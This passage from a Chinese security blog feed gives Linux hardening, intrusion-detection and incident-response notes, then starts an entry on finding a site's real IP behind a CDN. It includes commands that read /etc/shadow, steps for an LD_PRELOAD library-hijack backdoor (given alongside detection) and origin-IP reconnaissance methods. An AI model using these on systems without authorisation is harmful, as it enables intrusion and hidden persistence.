<li>top #实时显示进程（process）的动态</li>
<li>cat /etc/services #查看服务与对应的端口</li>
<li>ls -la /etc/cron* #计划任务</li>
<li><strong>crontab -l #显示用户的计划任务</strong></li>
<li><strong>service –status-all #显示所有服务的状态</strong></li>
<li><strong>cat /etc/services #查看端口服务映射</strong></li>
<li>chkconfig –list #列出所有系统服务</li>
<li>chkconfig –list | grep on #列出所有启动的系统服务</li>
</ol>
<h3 id="0x16-网络通信"><a href="#0x16-网络通信" class="headerlink" title="0x16 网络通信"></a>0x16 网络通信</h3><ol>
<li>ifconfig -a #列出网卡信息</li>
<li>cat /etc/network/interfaces #列出网络接口信息</li>
<li>cat /etc/networks #</li>
<li>dnsdomainname #</li>
<li><strong>arp -a #查看系统arp表</strong></li>
<li><strong>route #输出路由信息</strong></li>
<li>cat /etc/resolv.conf #查看DNS配置信息</li>
<li>netstat -lntp #查看所有监听端口 -l：listening，-n：不解析，-t：tcp，-p：显示pid/程序名</li>
<li><strong>netstat -antp #查看所有已经建立的连接</strong> -a：all，-n：不解析，-t：tcp，-p：显示pid/程序名</li>
<li>iptables -L #列出防火墙的配置规则</li>
<li>lsof #列出打开的文件</li>
</ol>
<h3 id="0x17-软件信息"><a href="#0x17-软件信息" class="headerlink" title="0x17 软件信息"></a>0x17 软件信息</h3><ol>
<li>dpkg -l #列出已安装的软件</li>
<li>rpm -qa #列出已安装的软件</li>
<li>httpd -v #查看apache版本</li>
<li>apache2 -v #查看apache版本</li>
<li>apache2ctl -M #查看Apache加载的模块</li>
<li>mysql –version #查看mysql版本</li>
<li>psql -V #查看postgresql版本</li>
<li>perl -v #查看perl版本</li>
<li>java -version #查看java版本</li>
<li>python –version #查看python版本</li>
</ol>
<h3 id="0x18-其他命令"><a href="#0x18-其他命令" class="headerlink" title="0x18 其他命令"></a>0x18 其他命令</h3><ol>
<li>find / -type d -name ‘python’ 2&gt;/dev/null #在根目录下找名为python的目录，去掉报错</li>
<li>which [filename] #在环境变量$PATH设置的目录里查符合条件的文件</li>
<li>locate [filename] #查找符合条件的文档</li>
<li>mount /dev/hda1 /mnt #将/dev/hda1挂载/mnt下</li>
<li>umount -v /dev/hda1 #通过设备名卸载</li>
<li>umount -v /mnt/hda1/ #通过挂载点卸载</li>
<li>more [filename] #一页一页读</li>
<li>tail #读文件最后几行</li>
<li>find . -type f | xargs grep “keyword” #查找目录下所有文件包含keyword的文件</li>
</ol>
<h3 id="0x19-参考链接"><a href="#0x19-参考链接" class="headerlink" title="0x19 参考链接"></a>0x19 参考链接</h3><p><a href="https://blog.csdn.net/Fly_hps/article/details/80541856" target="_blank" rel="noopener">https://blog.csdn.net/Fly_hps/article/details/80541856</a></p>
<h2 id="0x20-安全加固"><a href="#0x20-安全加固" class="headerlink" title="0x20 安全加固"></a>0x20 安全加固</h2><h3 id="0x21-账号安全"><a href="#0x21-账号安全" class="headerlink" title="0x21 账号安全"></a>0x21 账号安全</h3><p><strong>查看root权限账号</strong></p>
<ol>
<li>awk -F : ‘($3==0){print $1}’ /etc/passwd </li>
<li>鉴别其他非root的用户，保留？删除？锁定？注释(修改vim /etc/passwd，用户前面加#)？等等</li>
</ol>
<p><strong>查看登录权限的账号</strong></p>
<ol>
<li>awk -F : ‘($7==”/usr/sbin/nologin”){print $1}’ /etc/passwd </li>
</ol>
<p><strong>查看空密码的账号</strong></p>
<ol>
<li>查看文件/etc/passwd，第二个::之间为空的，即空密码</li>
<li>awk -F “:” ‘($2==””){print $1}’ /etc/shadow</li>
</ol>
<p><strong>添加用户</strong></p>
<ol>
<li>useradd username</li>
</ol>
<p><strong>设置密码</strong></p>
<ol>
<li>passwd username</li>
</ol>
<p><strong>拒绝系统用户登录</strong></p>
<ol>
<li>usermod -s/–shell /usr/sbin/nologin username</li>
<li>或者</li>
<li>usermod -s/–shell /bin/false username</li>
</ol>
<p><strong>锁定帐号</strong></p>
<ol>
<li>passwd -l/–lock username </li>
<li>还可以编辑/etc/passwd文件，在用户的shell后添加nologin</li>
<li>一般需要锁定的用户：lp,nuucp,hpdb,sync,adm</li>
</ol>
<p><strong>解锁账号</strong></p>
<ol>
<li>passwd -u/–unlock username</li>
</ol>
<p><strong>删除帐号</strong></p>
<ol>
<li>passwd -d/–delete username</li>
</ol>
<p><strong>添加（不能登录）账号</strong></p>
<ol>
<li>useradd -d /usr/local/apache -g apache -s /bin/false apache</li>
</ol>
<p><strong>设置密码策略</strong></p>
<ol>
<li>查看配置文件/etc/login.defs</li>
<li>PASS_MAX_DAYS 99999 #密码最长有效期，<strong>建议</strong>不大于90天</li>
<li>PASS_MIN_DAYS 6 #密码修改之间最小的天数，<strong>建议</strong>不小于6天</li>
<li>pass_MIN_LEN    8 #密码最小长度，<strong>建议</strong>不小于8位</li>
<li>PASS_WARN_AGE 7 #密码过期前几天开始提示用户修改密码，<strong>建议</strong>30天左右，小于最长有效期</li>
</ol>
<p><strong>设置用户密码强度</strong></p>
<ol>
<li>设置配置文件/etc/pam.d/sysetm-auth（centos）、/etc/pam.d/common-password（Ubuntu）</li>
<li>至少一个数字，一个小写字母，一个大写字母，一个特殊字符，长度至少8位</li>
<li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/9.png" alt></li>
</ol>
<p><strong>设置限制用户的登录次数</strong></p>
<ol>
<li>查看配置文件/etc/pam.d/sshd/</li>
<li>auth required pam_tally2.so deny=3 unlock_time=150 even_deny_root root_unlock_time=300 #无就新加，错误输入3次就锁定，锁定时间为150秒，若用户为root，则锁定300秒</li>
<li>pam_tally2 #查看被锁定的用户</li>
<li>pam_tally2 –reset -u [username] #将锁定的用户解锁</li>
</ol>
<p><strong>禁止root用户远程登录SSH</strong></p>
<ol>
<li>查看配置文件/etc/ssh/sshd_config </li>
<li>PermitRootLogin no #如果为yes，改为no</li>
<li><strong>脚本设置：</strong>（有风险，慎用）</li>
<li>#!/bin/bash</li>
<li>sed -i ‘/PermitRootLogin/c\PermitRootLogin no’ /etc/ssh/sshd_config</li>
<li><strong>不允许用户密码登录</strong></li>
<li>PasswordAuthentication no #前面有#，代表注释这行，去掉，如果为yes，则改为no</li>
<li><strong>添加IP白名单</strong></li>
<li>修改配置/etc/ssh/sshd_config</li>
<li>添加：AllowUsers *@10.100.*.*  #表示只允许10.100.0.0/16网段用户通过ssh登录</li>
</ol>
<p><strong>设置访问ip的白名单与黑名单</strong></p>
<ol>
<li>例如允许ssh登录的ip</li>
<li>vim /etc/hosts.allow</li>
<li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/13.png" alt></li>
<li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/14.png" alt></li>
<li>禁止ssh登录的ip</li>
<li>vim /etc/hosts.deny</li>
<li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/10.png" alt></li>
<li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/11.png" alt></li>
<li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/12.png" alt></li>
</ol>
<p><strong>设置主动注销</strong></p>
<ol>
<li>查看配置文件/etc/profile</li>
<li>cat /etc/profile | grep TMOUT | awk -F[=] ‘{print $2}’ #若无，则自主添加</li>
<li>配置文件/etc/profile底添加：TMOUT=300</li>
</ol>
<p><strong>历史命令保留数</strong></p>
<ol>
<li>设置配置文件/etc/profile</li>
<li>HISTSIZE=1000 #设置历史命令条数为1000</li>
</ol>
<p><strong>限制只有wheel组才能su</strong></p>
<ol>
<li>查看配置/etc/pam.d/su</li>
<li>是否存在配置：auth required pam_wheel.so</li>
<li>无则添加：</li>
<li>auth    required pam_wheel.so use_uid</li>
<li>auth sufficient pam_rootok.so</li>
<li>或添加：</li>
<li>auth required pam_wheel.so group=wheel</li>
<li>将用户test添加到wheel组</li>
<li>usermod -G wheel test</li>
</ol>
<h3 id="0x22-文件安全"><a href="#0x22-文件安全" class="headerlink" title="0x22 文件安全"></a>0x22 文件安全</h3><p><strong>设置初始文件的权限</strong></p>
<ol>
<li>查看命令：</li>
<li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1.png" alt></li>
<li>修改umask：</li>
<li>在/etc/profile设置umask 027（若无，则最后添加）</li>
<li>027对应权限为750，创建文件的用户有读写执行权限，同组用户有读执行权限，其他用户无权限。</li>
</ol>
<p><strong>锁定重要文件</strong></p>
<ol>
<li>重要文件：/etc/passwd、/etc/shadow、/etc/group、/etc/gshadow等等</li>
<li>ls -l /etc/passwd #建议权限为644</li>
<li>ls -l /etc/shadow #建议权限为400</li>
<li>ls -l /etc/group #建议权限为644</li>
<li>ls -l /etc/services #建议权限为644</li>
<li>ls -l /etc/login.defs #建议权限为644</li>
<li>ls -l /etc/ssh/ssh_config #建议权限为600</li>
<li>ls -l /etc/security/ #建议权限为600</li>
<li>chattr +i /etc/passwd #+i，表示文件不允许新增、删除、修改、改名、链接关系等</li>
<li>解锁：chattr -i /etc/passwd</li>
<li>lsattr：用来显示文件或目录的属性的</li>
<li>chattr +a /var/log/messages #只能追加数据，不能删除日志文件</li>
</ol>
<p><strong>防止ip欺骗</strong></p>
<ol>
<li>/etc/host.conf文件</li>
<li>order hosts,bind #先通过hosts文件解析，再DNS解析ip地址（也可以相反）</li>
<li>multi on #指定是否/etc/hosts文件中指定的主机可以有多个地址</li>
<li>ospoof on #指不允许对该服务器进行IP地址欺骗。IP欺骗是一种攻击系统安全的手段，通过把IP地址伪装成别的计算机，来取得其它计算机的信任。</li>
</ol>
<p><strong>禁止非root用户执行/etc/init.d/里的系统命令</strong></p>
<h3 id="0x23-日志安全"><a href="#0x23-日志安全" class="headerlink" title="0x23 日志安全"></a>0x23 日志安全</h3><ol>
<li>/var/log/messages #几乎所有的开机系统发生的错误都会在此记录，建议640</li>
<li>/var/log/syslog #事件记录监控程序日志</li>
<li>/var/log/lastlog #记录每个用户最后的登录信息</li>
<li>/var/log/auth.log #用户认证日志</li>
<li>/var/log/daemon.log #系统进程日志</li>
<li>/var/log/kern.log #内核产生的信息</li>
</ol>
<p><strong>建立日志服务器</strong></p>
<ol>
<li>日志服务器配置文件：/etc/rsyslog.conf</li>
<li><strong>服务器：</strong></li>
<li>ipaddr：192.168.100.4</li>
<li>netmask：255.255.255.0</li>
<li>bootproto：static</li>
<li><strong>客户端：</strong></li>
<li>ipaddr：192.168.100.15</li>
<li><strong>服务器配置：</strong></li>
<li>设置配置文件：TCP/UDP任选一个</li>
<li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/2.png" alt></li>
<li>创建设置文件，配置需要监控的客户端</li>
<li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/3.png" alt></li>
<li>fromhost-ip 哪个ip发过来的</li>
<li>isequal 等于</li>
<li>保存退出，重启日志服务：</li>
<li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/5.png" alt></li>
<li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/6.png" alt></li>
<li><strong>客户端配置：</strong></li>
<li>设置配置文件：vim /etc/rsyslog.conf</li>
<li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/4.png" alt></li>
<li>保存退出，重启日志服务：</li>
<li>systemctl restart rsyslog #centos7</li>
<li></li>
<li><strong>验证日志服务器：</strong></li>
<li>ssh登录测试</li>
<li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/7.png" alt></li>
<li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/8.png" alt></li>
</ol>
<h3 id="0x24-禁ping"><a href="#0x24-禁ping" class="headerlink" title="0x24 禁ping"></a>0x24 禁ping</h3><ol>
<li>echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all #开启</li>
<li>echo 0 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all #关闭</li>
<li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/17.png" alt></li>
</ol>
<h3 id="0x25-预防flood攻击"><a href="#0x25-预防flood攻击" class="headerlink" title="0x25 预防flood攻击"></a>0x25 预防flood攻击</h3><ol>
<li>关键字：DDoS攻击、TCP_SYN flood、半开式连接攻击、拒绝服务攻击</li>
<li>原理：利用TCP协议实现上的缺陷，通过向网络服务器的端口发送大量的伪造源地址的攻击报文，造成目标服务器中的半开连接队列占满，从而阻止其他合法用户的访问。</li>
<li>通俗讲：一次标准的TCP连接，有三次握手，而TCP_SYN Flood实现过程就只有前两步骤，服务器就会在一定时间内等待接收客户端的ACK消息的状态。服务器的可用的TCP连接是有限的。</li>
<li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/15.png" alt></li>
<li>vim /etc/sysctl.conf</li>
<li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/16.png" alt></li>
<li>sysctl -p    #使上面配置生效</li>
</ol>
<h3 id="0x26-NTP服务放大攻击"><a href="#0x26-NTP服务放大攻击" class="headerlink" title="0x26 NTP服务放大攻击"></a>0x26 NTP服务放大攻击</h3><p><a href="https://www.cnblogs.com/kevingrace/p/6756515.html" target="_blank" rel="noopener">https://www.cnblogs.com/kevingrace/p/6756515.html</a></p>
<h3 id="0x27-通用简单预防DDOS"><a href="#0x27-通用简单预防DDOS" class="headerlink" title="0x27 通用简单预防DDOS"></a>0x27 通用简单预防DDOS</h3><ol>
<li>关闭不必要的服务或端口</li>
<li>禁止对主机非开放服务的访问</li>
<li>及时安装系统补丁</li>
<li>限制同一时间内打开的syn半连接数目</li>
<li>缩短syn半连接的超时时间</li>
<li>启用Linux自带的防火墙防DDOS属性</li>
<li>安装相应的防护软件</li>
<li>购买DDOS防御产品</li>
</ol>
<h3 id="0x28-参考链接"><a href="#0x28-参考链接" class="headerlink" title="0x28 参考链接"></a>0x28 参考链接</h3><p><a href="https://blog.csdn.net/qq_36119192/article/details/82906799" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/82906799</a><br><a href="https://www.cnblogs.com/kevingrace/p/6756515.html" target="_blank" rel="noopener">https://www.cnblogs.com/kevingrace/p/6756515.html</a></p>
<h2 id="0x30-入侵检测"><a href="#0x30-入侵检测" class="headerlink" title="0x30 入侵检测"></a>0x30 入侵检测</h2><h3 id="0x31-入侵痕迹搜集命令"><a href="#0x31-入侵痕迹搜集命令" class="headerlink" title="0x31 入侵痕迹搜集命令"></a>0x31 入侵痕迹搜集命令</h3><ol>
<li><strong>检查用户</strong></li>
<li>last #查看登入过系统的用户信息</li>
<li>lastb #查看登录失败的用户信息</li>
<li>lastlog #查看所有用户的最近一次登录信息</li>
<li>who #查看当前登录系统的用户情况，以及正在执行的程序</li>
<li>w #查看当前登录系统的用户情况，以及正在执行的程序</li>
<li>history #查看执行命令历史记录</li>
<li>ls -l [filename] #查看文件最后修改时间</li>
<li>awk -F : ‘($3==0){print $1}’ /etc/passwd #查看是否存在其他特权用户（除root之外）</li>
<li>awk -F : ‘length($2)==0 {print $1}’ /etc/shadow #查看是否存在空口令的用户</li>
<li><strong>检查进程</strong></li>
<li>top #实时显示进程（process）的动态</li>
<li>ps -aux #查看当前进程 (process) 的状态</li>
<li>lsof -p pid #查看进程所打开文件</li>
<li>lsof -i:port #查看端口对应的进程</li>
<li>ls -l /proc/{pid}/exe #获取绝对路径下的文件</li>
<li><strong>查看隐藏进程</strong></li>
<li>ps -aux –sort=-pcpu|head -10 #查看隐藏进程</li>
<li><strong>检查文件</strong></li>
<li>stat filename #查看文件的修改时间、大小、权限等信息</li>
<li>find / -uid 0 -print #查看有特权用户的文件</li>
<li>find / -name “…” -prin #查看用户名为…的文件</li>
<li>md5sum -b filename #查看文件的MD5值</li>
<li>whereis filename #查看文件的路径</li>
<li>ls -l filename -h #查看文件大小</li>
<li>du -sh filename #查看文件大小</li>
<li><strong>检查网络</strong></li>
<li>top #实时显示进程（process）的动态</li>
<li>netstat -antp #查看所有已经建立的连接</li>
<li>netstat -lntp #查看所有监听端口</li>
<li>ifconfig -a #列出网卡信息</li>
<li>arp -a #查看系统arp表</li>
<li><strong>检查计划任务</strong></li>
<li>crontab -l #列出计划任务</li>
<li>cat /etc/crontab #检查计划任务文件</li>
<li>ls -l /etc/cron.* #查看cron文件是否变化的详细信息</li>
<li><strong>检查后门</strong></li>
<li>cat $HOME/.ssh/authorized_keys #查看ssh永久链接文件</li>
<li>lsmod #检查内核模块</li>
<li>chkconfig –list #检查自启动</li>
<li>systemctl list-units -type=service –all #检查自启动</li>
<li>ls /etc/rc[n].d #</li>
<li>find / -name “.rhosts” -print</li>
<li>find / -name “.forward” -print</li>
</ol>
<p><a href="https://blog.csdn.net/weixin_44335190/article/details/91353637" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44335190/article/details/91353637</a><br><a href="https://blog.csdn.net/itcast_cn/article/details/80096103" target="_blank" rel="noopener">https://blog.csdn.net/itcast_cn/article/details/80096103</a><br><a href="https://www.cnblogs.com/sanduo1314/p/7458415.html" target="_blank" rel="noopener">https://www.cnblogs.com/sanduo1314/p/7458415.html</a><br><a href="https://www.secpulse.com/archives/116824.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/116824.html</a><br><a href="https://www.cnblogs.com/canyezhizi/p/11194177.html" target="_blank" rel="noopener">https://www.cnblogs.com/canyezhizi/p/11194177.html</a></p>
<h2 id="0x40-应急响应"><a href="#0x40-应急响应" class="headerlink" title="0x40 应急响应"></a>0x40 应急响应</h2><h3 id="0x41-常见命令"><a href="#0x41-常见命令" class="headerlink" title="0x41 常见命令"></a>0x41 常见命令</h3><ol>
<li>top #实时显示进程（process）的动态</li>
<li>ps -aux | grep [keyword] #列出所有相关keyword的进程</li>
<li>lsof -p pid #查看进程所打开文件</li>
<li>lsof -i:port #查看端口对应的进程</li>
<li>ls -l /proc/{pid}/exe #获取绝对路径下的文件</li>
<li>netstat -antp #查看所有已经建立的连接</li>
<li>netstat -lntp #查看所有监听端口</li>
<li>last #查看最近登录的用户信息</li>
<li>crontab -l #列出计划任务</li>
<li>cat ~/.bash_history #查看历史命令</li>
<li>cat /etc/passwd #查看可疑账号</li>
<li>ls -alt #查看隐藏文件</li>
<li><strong>敏感目录</strong></li>
<li>/tmp #临时文件</li>
<li>/usr/sbin，/bin #命令所在目录</li>
<li>/etc/init.d #开机启动目录</li>
<li><strong>敏感文件</strong></li>
<li>/etc/rc.local #开机启动文件</li>
<li>/root/.bash_history #历史命令文件</li>
<li>/etc/passwd，/etc/shadow #用户账户信息</li>
<li>/etc/cron* #计划任务文件</li>
</ol>
<h3 id="0x42-安全工具"><a href="#0x42-安全工具" class="headerlink" title="0x42 安全工具"></a>0x42 安全工具</h3><ol>
<li><a href="https://sourceforge.net/projects/rkhunter/" target="_blank" rel="noopener">Rootkit Hunter</a></li>
<li>cd rkhunter</li>
<li>rkhunter –check/-c #扫描本地文件</li>
<li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/18.png" alt></li>
<li>cat /var/log/rkhunter.log | grep Warning &gt;/tmp/scan_log.txt</li>
<li>rkhunter –versioncheck #检查版本</li>
<li>rkhunter –update #更新</li>
<li></li>
<li><a href="http://www.chkrootkit.org/" target="_blank" rel="noopener">chkrootkit</a></li>
<li>chkrootkit #对重要文件进行扫描</li>
<li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/19.png" alt></li>
<li>chkrootkit -V #查看版本信息</li>
</ol>
<h3 id="0x43-Linux预加载型恶意动态链接库后门"><a href="#0x43-Linux预加载型恶意动态链接库后门" class="headerlink" title="0x43 Linux预加载型恶意动态链接库后门"></a>0x43 <a href="https://www.freebuf.com/column/162604.html" target="_blank" rel="noopener">Linux预加载型恶意动态链接库后门</a></h3><ol>
<li>Linux预加载的配置文件主要是：LD_PRELOAD 和 /etc/ld.so.preload</li>
<li>主要技术：</li>
<li><ul>
<li>更改LD_PRELOAD的环境变量，加载恶意库文件xx.so</li>
</ul>
</li>
<li><ul>
<li>/etc/ld.so.preload加载恶意的库文件</li>
</ul>
</li>
<li><ul>
<li>更改默认的库文件/etc/ld.so.preload为其他库文件</li>
</ul>
</li>
<li>第二条使用的最多，通过更改/etc/ld.so.preload来预加载其他恶意的库文件来实现对系统的命令，如cat、netstat、top等进行劫持，从而达到隐藏进程、连接等目的。</li>
</ol>
<p><strong>实现劫持</strong></p>
<ol>
<li>echo $LD_PRELOAD #一开始一般为空</li>
<li>LD_PRELOAD=…./xx.so #指定库文件</li>
<li>export LD_PRELOAD #加载库文件</li>
<li>echo $LD_PRELOAD #这时就有了刚指定加载的库文件</li>
</ol>
<p><strong>检测</strong></p>
<ol>
<li>echo $LD_PRELOAD #是否为空</li>
<li>cat /etc/ld.so.preload #是否存在</li>
<li><img src="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/20.png" alt></li>
</ol>
<p><strong>处置</strong></p>
<ol>
<li>删除/etc/ld.so.preload</li>
<li>rm /etc/ld.so.preload</li>
</ol>
<h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol>
<li><a href="https://www.baidu.com/" target="_blank" rel="noopener">https://www.baidu.com/</a></li>
<li><a href="https://www.freebuf.com/" target="_blank" rel="noopener">https://www.freebuf.com/</a></li>
</ol>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>信息搜集</tag>
        <tag>安全加固</tag>
        <tag>入侵检测</tag>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>寻找网站的真实IP</title>
    <url>/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/</url>
    <content><![CDATA[<h2 id="0x00-前排"><a href="#0x00-前排" class="headerlink" title="0x00 前排"></a>0x00 前排</h2><ol>
<li>CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。</li>
</ol>
<h2 id="0x10-判断是否使用CDN"><a href="#0x10-判断是否使用CDN" class="headerlink" title="0x10 判断是否使用CDN"></a>0x10 判断是否使用CDN</h2><ol>
<li>多地ping</li>
<li><a href="http://ping.chinaz.com/" target="_blank" rel="noopener">http://ping.chinaz.com/</a>、<a href="https://www.wepcc.com/" target="_blank" rel="noopener">https://www.wepcc.com/</a>、<a href="https://asm.ca.com/en/ping.php" target="_blank" rel="noopener">https://asm.ca.com/en/ping.php</a></li>
<li><img src="/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/1.png" alt></li>
<li>nslookup</li>
<li><img src="/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/2.png" alt></li>
</ol>
<h2 id="0X20-绕CDN找真实IP"><a href="#0X20-绕CDN找真实IP" class="headerlink" title="0X20 绕CDN找真实IP"></a>0X20 绕CDN找真实IP</h2><h3 id="0x21-子域名"><a href="#0x21-子域名" class="headerlink" title="0x21 子域名"></a>0x21 子域名</h3><ol>
<li>成本问题，厂商一般只对根域使用CDN，子域不使用CDN，还有分二级、三级、四级子域名。</li>
<li>在线域名解析与查询子域名工具：</li>
<li><a href="https://x.threatbook.cn/" target="_blank" rel="noopener">微步在线</a>，<a href="#jump">DNS记录</a>等等</li>
<li>本地脚本工具：</li>
<li>Layer4.2、<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">subDomainsBrute</a></li>
<li>搜索引擎<a href="https://www.google.com/" target="_blank" rel="noopener">google</a>/<a href="https://www.baidu.com/" target="_blank" rel="noopener">baidu</a>/<a href="https://cn.bing.com/" target="_blank" rel="noopener">bing</a>搜索法：</li>
<li>site:baidu.com -www</li>
<li>有的厂商只对www.xxx.com域名使用CDN，xxx.com不使用CDN，方便维护而不用等CDN缓存。</li>
</ol>
<h3 id="0x22-DNS记录"><a href="#0x22-DNS记录" class="headerlink" title="0x22 DNS记录"></a>0x22 <span id="jump">DNS记录</span></h3><ol>
<li><a href="https://dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://dnsdb.io/zh-cn/</a> #域名DNS记录查询</li>
<li><a href="https://toolbar.netcraft.com/site_report?url=" target="_blank" rel="noopener">https://toolbar.netcraft.com/site_report?url=</a> #查询服务器信息</li>
<li><a href="http://viewdns.info/" target="_blank" rel="noopener">http://viewdns.info/</a> #域名DNS记录查询</li>
<li><a href="https://tools.ipip.net/domain.php" target="_blank" rel="noopener">https://tools.ipip.net/domain.php</a> #域名DNS记录查询</li>
<li><a href="https://securitytrails.com/" target="_blank" rel="noopener">https://securitytrails.com/</a> #网站的历史数据</li>
<li><a href="https://webiplookup.com/" target="_blank" rel="noopener">https://webiplookup.com/</a></li>
</ol>
<h3 id="0x23-网络空间搜索引擎"><a href="#0x23-网络空间搜索引擎" class="headerlink" title="0x23 网络空间搜索引擎"></a>0x23 网络空间搜索引擎</h3><ol>
<li><a href="https://fofa.so/" target="_blank" rel="noopener">fofa</a></li>
<li><a href="https://www.shodan.io/" target="_blank" rel="noopener">shodan</a></li>
<li><a href="https://www.zoomeye.org/" target="_blank" rel="noopener">zoomeye</a></li>
</ol>
